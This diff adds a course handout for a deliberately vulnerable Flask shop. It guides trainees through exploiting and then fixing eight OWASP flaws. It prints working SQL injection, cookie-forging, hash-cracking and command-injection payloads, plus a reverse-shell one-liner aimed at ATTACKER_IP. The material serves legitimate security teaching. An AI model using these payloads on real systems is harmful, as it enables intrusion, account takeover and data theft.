@@ -1,0 +1,757 @@
+**Module 4: OWASP Bingo**
+
+Companion Instructions & Learning Notes
+
+*Secure Web Application Development --- BBC Academy / JBI Training*
+
+vulnerable_shop.py \| vulnerable_shop_fixed.py
+
+**Overview**
+
+This exercise uses a deliberately vulnerable Flask web application ---
+ShopCo --- to give delegates hands-on experience identifying and
+categorising real security flaws in source code. Unlike black-box tools
+such as OWASP Juice Shop, this exercise puts you in the developer\'s
+seat: you can see exactly why each vulnerability exists and what a
+minimal fix looks like.
+
++-----------------------------------------------------------------------+
+| **📋 Three files, three stages**                                      |
+|                                                                       |
+| Stage 1 --- Identify: Read vulnerable_shop_CLEAN.py (no hints). Find  |
+| and annotate the 8 flaws.                                             |
+|                                                                       |
+| Stage 2 --- Exploit: Run vulnerable_shop.py in your VM and use a      |
+| browser to trigger each flaw.                                         |
+|                                                                       |
+| Stage 3 --- Fix: Compare vulnerable_shop_fixed.py line-by-line and    |
+| understand each correction.                                           |
++-----------------------------------------------------------------------+
+
+**Stage 1 --- Identify the Flaws (15 minutes)**
+
+Work individually or in pairs. Read through the clean source code
+printout (or open vulnerable_shop_CLEAN.py in a text editor). For each
+flaw you find, write:
+
+-   The line number or function name where the flaw occurs
+
+-   The OWASP Top 10:2025 category you believe it belongs to
+
+-   A one-sentence description of what an attacker could do with it
+
++-----------------------------------------------------------------------+
+| **💡 Hints --- where to look**                                        |
+|                                                                       |
+| There are TWO flaws in the first 6 lines of the file.                 |
+|                                                                       |
+| The login() function contains THREE separate flaws.                   |
+|                                                                       |
+| The profile() function contains TWO separate flaws.                   |
+|                                                                       |
+| The ping() function contains ONE flaw --- but it\'s the most severe.  |
++-----------------------------------------------------------------------+
+
+Use this worksheet to record your findings:
+
+  ----------------------------------------------------------------------------
+  **Flaw   **Location**      **OWASP           **What could an attacker do?**
+  \#**                       Category**        
+  -------- ----------------- ----------------- -------------------------------
+  **1**                                        
+
+  **2**                                        
+
+  **3**                                        
+
+  **4**                                        
+
+  **5**                                        
+
+  **6**                                        
+
+  **7**                                        
+
+  **8**                                        
+  ----------------------------------------------------------------------------
+
+**Stage 2 --- Exploit the Flaws (30 minutes)**
+
+Start the vulnerable application on your VM and use Firefox and ZAP to
+demonstrate each flaw in action. You should have both the source code
+and the running app visible simultaneously.
+
++-----------------------------------------------------------------------+
+| **⚙️ Starting the app**                                               |
+|                                                                       |
+| cd \~/vuln_flask_app/module4_owasp_bingo                              |
+|                                                                       |
+| pip3 install flask \--break-system-packages                           |
+|                                                                       |
+| python3 vulnerable_shop.py                                            |
+|                                                                       |
+| Open Firefox and navigate to: http://localhost:5000                   |
++-----------------------------------------------------------------------+
+
+**Flaws 1 & 2 --- Weak Secret Key & Debug Mode**
+
+These two flaws are in the application configuration --- before any
+route is defined. They are particularly dangerous because they are
+invisible to users and often introduced by developers who intend to
+\"fix them before production.\"
+
++-----------------------------------------------------------------------+
+| **Exploit A --- Trigger the Werkzeug Interactive Debugger (Flaw 2)**  |
+|                                                                       |
+| 1\. With the app running, visit: http://localhost:5000/crash_demo     |
+|                                                                       |
+| (This route does not exist --- Flask will raise a 404 error)          |
+|                                                                       |
+| 2\. With DEBUG=True, Flask shows the Werkzeug debugger instead of a   |
+| plain error page.                                                     |
+|                                                                       |
+| 3\. Click the terminal icon on any stack frame line.                  |
+|                                                                       |
+| 4\. Type Python code in the console: import os;                       |
+| os.listdir(\"/home/ubuntu\")                                          |
+|                                                                       |
+| 5\. You now have arbitrary code execution in the server process.      |
+|                                                                       |
+| **Payload:**                                                          |
+|                                                                       |
+| > http://localhost:5000/profile?user_id=999 (triggers a DB miss →     |
+| > exception → debugger)                                               |
+|                                                                       |
+| **Expected result:**                                                  |
+|                                                                       |
+| > *Werkzeug interactive Python console opens. Any Python command      |
+| > executes with the server\'s privileges.*                            |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **Exploit B --- Forge a Session Cookie Using the Known Secret Key     |
+| (Flaw 1)**                                                            |
+|                                                                       |
+| 1\. Open a terminal and install flask: pip3 install flask             |
+| \--break-system-packages                                              |
+|                                                                       |
+| 2\. Run the following Python snippet to forge an admin session        |
+| cookie:                                                               |
+|                                                                       |
+| from flask.sessions import SecureCookieSessionInterface               |
+|                                                                       |
+| from flask import Flask                                               |
+|                                                                       |
+| app = Flask(\_\_name\_\_)                                             |
+|                                                                       |
+| app.secret_key = \"password\" \# The key we read from the source      |
+|                                                                       |
+| si = app.session_interface                                            |
+|                                                                       |
+| session = si.open_session(app, None)                                  |
+|                                                                       |
+| session\[\"user\"\] = \"admin\"                                       |
+|                                                                       |
+| session\[\"role\"\] = \"admin\"                                       |
+|                                                                       |
+| \# Serialise to get the cookie value                                  |
+|                                                                       |
+| \# (use flask-unsign: pip3 install flask-unsign)                      |
+|                                                                       |
+| Shortcut using flask-unsign:                                          |
+|                                                                       |
+| flask-unsign \--sign \--cookie \'{\"role\": \"admin\", \"user\":      |
+| \"admin\"}\' \--secret password                                       |
+|                                                                       |
+| 3\. Copy the output cookie value.                                     |
+|                                                                       |
+| 4\. In Firefox DevTools → Storage → Cookies → set \"session\" to the  |
+| forged value.                                                         |
+|                                                                       |
+| 5\. Visit http://localhost:5000/admin --- you are now admin without   |
+| any credentials.                                                      |
+|                                                                       |
+| **Payload:**                                                          |
+|                                                                       |
+| > flask-unsign \--sign \--cookie                                      |
+| > \'{\"role\":\"admin\",\"user\":\"admin\"}\' \--secret password      |
+|                                                                       |
+| **Expected result:**                                                  |
+|                                                                       |
+| > *The /admin panel loads and shows all user records including        |
+| > password hashes.*                                                   |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **✓ Fix 1: Secret key from environment variable**                     |
+|                                                                       |
+| app.secret_key = os.environ\[\"FLASK_SECRET_KEY\"\] --- the key never |
+| appears in source code. Without the key, session cookies cannot be    |
+| forged. Fix 2: app.config\[\"DEBUG\"\] =                              |
+| os.environ.get(\"FLASK_DEBUG\", \"false\").lower() == \"true\" ---    |
+| debug mode only activates if explicitly enabled via an environment    |
+| variable that should never be set in production.                      |
++-----------------------------------------------------------------------+
+
+**Flaws 3 & 4 --- MD5 Password Hashing & SQL Injection**
+
+Both flaws live in the login() function. Flaw 4 is particularly powerful
+because it bypasses authentication entirely --- the password hash is
+never even computed.
+
++-----------------------------------------------------------------------+
+| **Exploit C --- SQL Injection: Login Bypass (Flaw 4)**                |
+|                                                                       |
+| 1\. Go to: http://localhost:5000/login                                |
+|                                                                       |
+| 2\. In the Username field enter the payload below.                    |
+|                                                                       |
+| 3\. In the Password field enter anything (e.g. \"x\").                |
+|                                                                       |
+| 4\. Click Login.                                                      |
+|                                                                       |
+| The resulting SQL becomes:                                            |
+|                                                                       |
+| SELECT \* FROM users WHERE username=\'admin\' \--\' AND               |
+| password_hash=\'\...\'                                                |
+|                                                                       |
+| The \-- starts a SQL comment, which discards the password check       |
+| entirely.                                                             |
+|                                                                       |
+| The query matches the admin row and logs you in as admin with no      |
+| valid password.                                                       |
+|                                                                       |
+| **Payload:**                                                          |
+|                                                                       |
+| > admin\' \--                                                         |
+|                                                                       |
+| **Expected result:**                                                  |
+|                                                                       |
+| > *You are logged in as admin. The page says \'Logout (admin)\'. No   |
+| > correct password was needed.*                                       |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **Exploit D --- SQL Injection via Search: Extract User Table (Flaw    |
+| 4)**                                                                  |
+|                                                                       |
+| 1\. Go to: http://localhost:5000/search                               |
+|                                                                       |
+| 2\. Enter the payload below into the search box.                      |
+|                                                                       |
+| 3\. The product search returns columns from the USERS table instead.  |
+|                                                                       |
+| This is a UNION-based injection: the attacker adds a second SELECT    |
+| that                                                                  |
+|                                                                       |
+| returns data from a completely different table.                       |
+|                                                                       |
+| **Payload:**                                                          |
+|                                                                       |
+| > %\' UNION SELECT id, username, password_hash, role, email FROM      |
+| > users \--                                                           |
+|                                                                       |
+| **Expected result:**                                                  |
+|                                                                       |
+| > *The search results now show all usernames, bcrypt hashes, roles    |
+| > and emails from the users table.*                                   |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **Exploit E --- Crack the MD5 Hashes with HashCat (Flaw 3)**          |
+|                                                                       |
+| 1\. From the IDOR or SQLi output, extract the password_hash column.   |
+|                                                                       |
+| admin: 7f004cb8bab7e3df07ad56a5f8d4e0f8                               |
+|                                                                       |
+| alice: 482c811da5d5b4bc6d497ffa98491e38                               |
+|                                                                       |
+| bob: d8578edf8458ce06fbc5bb76a58c5ca4                                 |
+|                                                                       |
+| 2\. Save to a file: echo \"7f004cb8bab7e3df07ad56a5f8d4e0f8\" \>      |
+| hashes.txt                                                            |
+|                                                                       |
+| 3\. Run HashCat against rockyou.txt:                                  |
+|                                                                       |
+| hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt              |
+|                                                                       |
+| 4\. All three passwords crack in under 1 second.                      |
+|                                                                       |
+| **Payload:**                                                          |
+|                                                                       |
+| > hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt            |
+|                                                                       |
+| **Expected result:**                                                  |
+|                                                                       |
+| > *Passwords: letmein / password123 / qwerty --- cracked in seconds.* |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **✓ Fix 3 & 4: bcrypt + parameterised queries**                       |
+|                                                                       |
+| Fix 3: bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))    |
+| --- bcrypt is designed to be slow. The same MD5 cracking run takes    |
+| hours or days with bcrypt. Fix 4: db.execute(\"SELECT \* FROM users   |
+| WHERE username = ?\", (username,)) --- the ? placeholder passes the   |
+| value as data, never as SQL syntax. No matter what the user types, it |
+| cannot alter the query structure.                                     |
++-----------------------------------------------------------------------+
+
+**Flaw 5 --- Session Stores Username Instead of User ID**
+
+This flaw interacts with Flaw 1. When the secret key is weak, the
+combination means an attacker can forge a session cookie for any
+username they choose --- including admin --- without needing to know
+that user\'s password or even that user\'s ID.
+
++-----------------------------------------------------------------------+
+| **Exploit F --- Privilege Escalation via Session Manipulation (Flaw   |
+| 5)**                                                                  |
+|                                                                       |
+| 1\. Log in normally as alice (alice / password123).                   |
+|                                                                       |
+| 2\. Open Firefox DevTools → Application → Cookies.                    |
+|                                                                       |
+| 3\. Copy the value of the \"session\" cookie.                         |
+|                                                                       |
+| 4\. Decode it: flask-unsign \--decode \--cookie \"\<paste cookie      |
+| here\>\"                                                              |
+|                                                                       |
+| You will see: {\"user\": \"alice\", \"role\": \"user\", \"\_fresh\":  |
+| true}                                                                 |
+|                                                                       |
+| 5\. Re-sign with role=admin:                                          |
+|                                                                       |
+| flask-unsign \--sign \--cookie                                        |
+| \'{\"user\":\"alice\",\"role\":\"admin\"}\' \--secret password        |
+|                                                                       |
+| 6\. Paste the new cookie value back into DevTools.                    |
+|                                                                       |
+| 7\. Visit /admin --- alice now has admin access.                      |
+|                                                                       |
+| Even more powerful: substitute \"user\": \"admin\" to impersonate the |
+| admin account entirely.                                               |
+|                                                                       |
+| **Payload:**                                                          |
+|                                                                       |
+| > flask-unsign \--sign \--cookie                                      |
+| > \'{\"user\":\"alice\",\"role\":\"admin\"}\' \--secret password      |
+|                                                                       |
+| **Expected result:**                                                  |
+|                                                                       |
+| > *Alice\'s account now has admin role. /admin shows all user         |
+| > records.*                                                           |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **✓ Fix 5: Store user_id in the session, re-fetch role from the DB**  |
+|                                                                       |
+| session\[\"user_id\"\] = row\[\"id\"\] --- an integer that cannot be  |
+| changed by the user. The role is looked up from the database on every |
+| request using get_current_user(), which queries by user_id. Even if   |
+| an attacker could forge the session, they could only set a user_id    |
+| --- and the DB lookup for that ID returns the correct, unmodified     |
+| role.                                                                 |
++-----------------------------------------------------------------------+
+
+**Flaws 6 & 7 --- Missing Authentication & IDOR**
+
+These two flaws combine: not only can any visitor access the /profile
+route without logging in, but once there they can read any user\'s data
+--- including password hashes --- simply by changing a number in the
+URL.
+
++-----------------------------------------------------------------------+
+| **Exploit G --- Unauthenticated IDOR: Read Any User Profile (Flaws 6  |
+| & 7)**                                                                |
+|                                                                       |
+| 1\. Make sure you are logged OUT (visit /logout).                     |
+|                                                                       |
+| 2\. Visit: http://localhost:5000/profile?user_id=1                    |
+|                                                                       |
+| You see the admin account, including their password hash.             |
+|                                                                       |
+| 3\. Change to user_id=2, then user_id=3.                              |
+|                                                                       |
+| 4\. You can enumerate every user account without any authentication.  |
+|                                                                       |
+| 5\. Combine with HashCat to crack the MD5 hashes offline.             |
+|                                                                       |
+| Notice: no login was required at any point in this process.           |
+|                                                                       |
+| **Payload:**                                                          |
+|                                                                       |
+| > http://localhost:5000/profile?user_id=1 → then 2 → then 3           |
+|                                                                       |
+| **Expected result:**                                                  |
+|                                                                       |
+| > *All three user records returned including password_hash, email,    |
+| > full_name and role --- no login required.*                          |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **✓ Fix 6 & 7: \@login_required decorator + load profile from         |
+| session**                                                             |
+|                                                                       |
+| Fix 6: \@login_required on the route redirects any unauthenticated    |
+| request to /login. Fix 7: The profile route no longer accepts a       |
+| user_id parameter at all. It calls get_current_user() which loads the |
+| record for session\[\"user_id\"\] only. Alice can never see Bob\'s    |
+| profile --- even if she is authenticated.                             |
++-----------------------------------------------------------------------+
+
+**Flaw 8 --- Command Injection via os.popen()**
+
+This is the most severe flaw in the application. The /ping tool passes
+user input directly to a shell command. Because os.popen() invokes
+/bin/sh, the shell interprets metacharacters --- allowing an attacker to
+run arbitrary system commands.
+
++-----------------------------------------------------------------------+
+| **Exploit H --- Command Injection: Read Sensitive Files (Flaw 8)**    |
+|                                                                       |
+| 1\. Visit: http://localhost:5000/ping                                 |
+|                                                                       |
+| 2\. Enter the payload below in the host field.                        |
+|                                                                       |
+| 3\. The ; character ends the ping command and starts a new shell      |
+| command.                                                              |
+|                                                                       |
+| 4\. Try progressively more powerful payloads:                         |
+|                                                                       |
+| 127.0.0.1; id                                                         |
+|                                                                       |
+| 127.0.0.1; whoami                                                     |
+|                                                                       |
+| 127.0.0.1; cat /etc/passwd                                            |
+|                                                                       |
+| 127.0.0.1; ls -la /home/ubuntu                                        |
+|                                                                       |
+| 127.0.0.1; cat shop.db \| base64                                      |
+|                                                                       |
+| 5\. The last payload exfiltrates the entire SQLite database.          |
+|                                                                       |
+| In a real attack, the & operator could establish a reverse shell.     |
+|                                                                       |
+| **Payload:**                                                          |
+|                                                                       |
+| > 127.0.0.1; cat /etc/passwd                                          |
+|                                                                       |
+| **Expected result:**                                                  |
+|                                                                       |
+| > *The /etc/passwd file contents are displayed in the browser below   |
+| > the ping output.*                                                   |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **⚠️ Instructor note --- stop here before the reverse shell payload** |
+|                                                                       |
+| The payload 127.0.0.1; bash -i \>& /dev/tcp/ATTACKER_IP/4444 0\>&1    |
+| would establish a                                                     |
+|                                                                       |
+| reverse shell from the VM to any listener. Demonstrate the concept by |
+| showing the command                                                   |
+|                                                                       |
+| without executing it, to keep the exercise within the closed lab      |
+| boundary.                                                             |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **✓ Fix 8: Input allowlist + subprocess with shell=False**            |
+|                                                                       |
+| Fix 8a: re.fullmatch(r\"\[a-zA-Z0-9.\\-\]{1,253}\", host) --- rejects |
+| any input containing shell metacharacters before the command is       |
+| constructed. Fix 8b: subprocess.run(\[\"ping\", \"-c\", \"2\",        |
+| host\], shell=False) --- passes the command as a list of strings      |
+| directly to the OS. No shell is invoked, so no shell metacharacters   |
+| are interpreted --- even if the allowlist were somehow bypassed.      |
++-----------------------------------------------------------------------+
+
+**Stage 3 --- Compare the Fixed Version (10 minutes)**
+
+Open vulnerable_shop_fixed.py alongside vulnerable_shop.py. For each of
+the 8 flaws, find the corresponding fix and read the inline comment that
+explains it.
+
+Suggested diff command --- run in a terminal on your VM:
+
+> diff \--side-by-side \--width=220 vulnerable_shop.py
+> vulnerable_shop_fixed.py \| less -S
+
+Or use VS Code\'s built-in diff view:
+
+> code \--diff vulnerable_shop.py vulnerable_shop_fixed.py
+
++-----------------------------------------------------------------------+
+| **🎯 Key observation**                                                |
+|                                                                       |
+| Count the lines that changed between the two files.                   |
+|                                                                       |
+| The security improvement is significant --- but the number of changed |
+| lines is surprisingly small.                                          |
+|                                                                       |
+| This illustrates that secure coding is not about writing more code;   |
+| it\'s about making                                                    |
+|                                                                       |
+| different choices at specific, identifiable decision points.          |
++-----------------------------------------------------------------------+
+
+**Answer Key --- OWASP Top 10:2025 Mapping**
+
+For instructor use --- reveal after Stage 1 is complete.
+
+  --------------------------------------------------------------------------------------------------
+  **\#**   **OWASP Category** **Code Location**         **What Happens**        **Potential Impact**
+  -------- ------------------ ------------------------- ----------------------- --------------------
+  **1**    A02 Cryptographic  app.secret_key            Hardcoded key allows    Attacker logs in as
+           Failures                                     session cookie forgery  any user including
+                                                                                admin with no
+                                                                                credentials
+
+  **2**    A05 Security       app.config\[\"DEBUG\"\]   Werkzeug debugger       Remote Code
+           Misconfiguration                             exposed over network    Execution ---
+                                                                                arbitrary Python in
+                                                                                server process
+
+  **3**    A02 Cryptographic  hashlib.md5()             MD5 is fast and         All passwords
+           Failures                                     rainbow-table-indexed   cracked in seconds
+                                                                                with HashCat +
+                                                                                rockyou.txt
+
+  **4**    A03 Injection      f-string in execute()     SQL structure alterable Authentication
+           (SQLi)                                       via user input          bypass; full
+                                                                                database dump via
+                                                                                UNION injection
+
+  **5**    A07 ID & Auth      session\[\"user\"\]       Mutable username stored Any username can be
+           Failures                                     in forgeable session    impersonated by
+                                                                                forging the session
+                                                                                cookie
+
+  **6**    A01 Broken Access  def profile():            No authentication check Any unauthenticated
+           Control                                      on the route            visitor reads user
+                                                                                data and password
+                                                                                hashes
+
+  **7**    A01 Broken Access  user_id from args         User ID accepted        Full enumeration of
+           Control (IDOR)                               directly from URL       all user accounts
+                                                        without validation      and password hashes
+
+  **8**    A03 Injection      os.popen(f\"ping          Shell metacharacters    Read /etc/passwd,
+           (Command)          {host}\")                 execute arbitrary OS    exfiltrate DB,
+                                                        commands                establish reverse
+                                                                                shell
+  --------------------------------------------------------------------------------------------------
+
+**Group Discussion Questions**
+
+Use these for the debrief. Aim for 10--15 minutes. The most productive
+discussions link the code-level findings back to the SSDLC stages
+covered in Module 5.
+
+**For All Delegates**
+
+1.  Looking at Flaws 1 and 2 --- both are in the first 6 lines of the
+    file. A developer almost certainly knew these were wrong when they
+    wrote them. What organisational or process pressures lead to
+    \"temporary\" insecure configurations reaching production?
+
+2.  Flaw 4 (SQL Injection) and Flaw 8 (Command Injection) share a root
+    cause: user input is trusted and concatenated into a command string.
+    What is the general principle that prevents both? (Answer: treat all
+    external data as data, never as code --- use
+    parameterisation/allowlists.)
+
+3.  Flaws 6 and 7 together mean an unauthenticated attacker can read
+    every user\'s password hash. At which SSDLC stage should these have
+    been caught? (Answer: threat modelling / requirements --- \"what if
+    an unauthenticated user guesses a user ID?\" is a 30-second threat
+    model question.)
+
+4.  Flaw 3 (MD5) is in the database seeder --- not in the live code.
+    What does this tell you about where security review needs to happen?
+    (Seed scripts, migration scripts, and test data often carry security
+    assumptions into production databases.)
+
+**For Developer Delegates**
+
+5.  The fix for Flaw 4 changes one line of code ---
+    f\"\...{username}\...\" becomes \"\...\", (username,). Why is a
+    one-character change (f → no f, comma added) significant enough to
+    warrant a dedicated OWASP category?
+
+6.  bcrypt\'s work factor (rounds=12) deliberately makes hashing slow.
+    Can you think of a scenario where this design choice could create a
+    denial-of-service vulnerability in your own application?
+
+7.  The fixed version\'s login() function still has a subtle timing
+    difference: if the username does not exist, bcrypt.checkpw() is
+    never called, making the response slightly faster. A sophisticated
+    attacker could use this timing difference for username enumeration.
+    How would you mitigate it?
+
+**For Tester & Sysadmin Delegates**
+
+8.  Which of the 8 flaws could you find using only a browser and the
+    network tab in DevTools --- without seeing the source code?
+
+9.  Flaw 2 (DEBUG mode) creates a visible difference in error responses.
+    How would you test for this in a black-box assessment without
+    triggering an unintended exception in production?
+
+10. If you discovered these flaws during a penetration test, how would
+    you score them using CVSS? Which flaw has the highest base score and
+    why?
+
+**Extension Challenges**
+
+For delegates who complete all three stages early, or as take-home
+exercises after the course.
+
++-----------------------------------------------------------------------+
+| **🔵 Explorer Track --- Breadth**                                     |
+|                                                                       |
+| E1: Find a 9th implicit flaw --- the search results in                |
+| vulnerable_shop.py render row data                                    |
+|                                                                       |
+| directly into HTML without escaping. What category is this? Craft an  |
+| XSS payload that                                                      |
+|                                                                       |
+| pops an alert when a search result is clicked.                        |
+|                                                                       |
+| E2: The /admin route in the vulnerable version checks                 |
+| session\[\"role\"\] --- which was set from                            |
+|                                                                       |
+| the database at login time. Describe a scenario where this is still   |
+| safe, and a scenario                                                  |
+|                                                                       |
+| where it creates a privilege escalation vulnerability even without    |
+| Flaw 1.                                                               |
+|                                                                       |
+| E3: Use ZAP\'s active scan against http://localhost:5000. Compare     |
+| what ZAP auto-detects                                                 |
+|                                                                       |
+| against your manual findings. Which flaws did ZAP miss?               |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **🟡 Practitioner Track --- Depth**                                   |
+|                                                                       |
+| P1: Modify vulnerable_shop.py to add a 9th flaw: a /download route    |
+| that accepts a                                                        |
+|                                                                       |
+| ?file= parameter and serves files from the server. Demonstrate path   |
+| traversal.                                                            |
+|                                                                       |
+| Then add the fix using os.path.abspath() and a whitelist check.       |
+|                                                                       |
+| P2: Install Bandit (pip3 install bandit) and run it against           |
+| vulnerable_shop.py.                                                   |
+|                                                                       |
+| Which of the 8 flaws does it detect automatically? Which does it miss |
+| and why?                                                              |
+|                                                                       |
+| Command: bandit -r . -ll                                              |
+|                                                                       |
+| P3: Write a requirements_vulnerable.txt with outdated package         |
+| versions (Flask==1.0.0,                                               |
+|                                                                       |
+| Werkzeug==0.14.1). Run pip-audit against it and document the CVEs     |
+| found.                                                                |
++-----------------------------------------------------------------------+
+
++-----------------------------------------------------------------------+
+| **🔴 Expert Track --- Synthesis**                                     |
+|                                                                       |
+| X1: The JWT alg:none attack from the Module 6 supplement is a close   |
+| cousin of Flaw 5.                                                     |
+|                                                                       |
+| Add a /api/token route to vulnerable_shop.py that issues a JWT with   |
+| role=user.                                                            |
+|                                                                       |
+| Forge an admin JWT using the alg:none technique, then add the fix.    |
+|                                                                       |
+| X2: Implement a complete defence-in-depth review: add structured      |
+| logging (Module 11),                                                  |
+|                                                                       |
+| rate limiting (Module 10), and Flask-Talisman headers (Module 12) to  |
+|                                                                       |
+| vulnerable_shop_fixed.py. The goal is a single file that demonstrates |
+| ALL modules.                                                          |
+|                                                                       |
+| X3: Using only the techniques in this exercise, write a test script   |
+| that automatically                                                    |
+|                                                                       |
+| verifies all 8 flaws are present in vulnerable_shop.py and all 8 are  |
+| absent in                                                             |
+|                                                                       |
+| vulnerable_shop_fixed.py. This is the beginning of a security         |
+| regression test suite.                                                |
++-----------------------------------------------------------------------+
+
+**Instructor Setup Notes**
+
+**VM Preparation**
+
+One-time setup per delegate VM (can be scripted via Appendix A of the
+Flask Supplement):
+
+> pip3 install flask bcrypt flask-unsign \--break-system-packages
+>
+> mkdir -p \~/vuln_flask_app/module4_owasp_bingo
+>
+> \# Copy the three Python files to the above directory
+>
+> cd \~/vuln_flask_app/module4_owasp_bingo
+>
+> python3 vulnerable_shop.py \# Port 5000 --- initialises shop.db on
+> first run
+>
+> \# In a second terminal:
+>
+> python3 vulnerable_shop_fixed.py \# Port 5001 --- initialises
+> shop_fixed.db
+
+**Running Both Apps Side-by-Side**
+
+Having both apps running simultaneously on ports 5000 and 5001 is very
+effective for the Stage 3 comparison. Delegates can switch between tabs
+to see the same operation behave differently.
+
+**Timing Guide**
+
+  -----------------------------------------------------------------------
+  **Stage**       **Time**    **Activity**
+  --------------- ----------- -------------------------------------------
+  **Stage 1 ---   15 mins     Delegates annotate the clean source code
+  Identify**                  individually or in pairs
+
+  **Reveal answer 5 mins      Instructor walks through each flaw --- ask
+  key**                       delegates who found it first
+
+  **Stage 2 ---   25 mins     Step through exploits A--H; instructor
+  Exploit**                   demos B (cookie forge) & H (command
+                              injection)
+
+  **Stage 3 ---   10 mins     Delegates open fixed file; instructor
+  Compare**                   highlights key changes for each flaw
+
+  **Debrief       5 mins      Select 2--3 discussion questions based on
+  discussion**                group composition
+  -----------------------------------------------------------------------
+
++-----------------------------------------------------------------------+
+| **📌 Mixed-ability note**                                             |
+|                                                                       |
+| Developer delegates typically find Flaws 3, 4, and 8 first            |
+| (code-level issues).                                                  |
+|                                                                       |
+| Tester and sysadmin delegates often spot Flaws 1 and 2 first          |
+| (configuration issues).                                               |
+|                                                                       |
+| This natural split is a feature, not a problem --- use it to prompt   |
+| cross-role discussion.                                                |
+|                                                                       |
+| If the group finishes Stage 1 early, skip straight to the most        |
+| impactful exploit (Flaw 8).                                           |
++-----------------------------------------------------------------------+
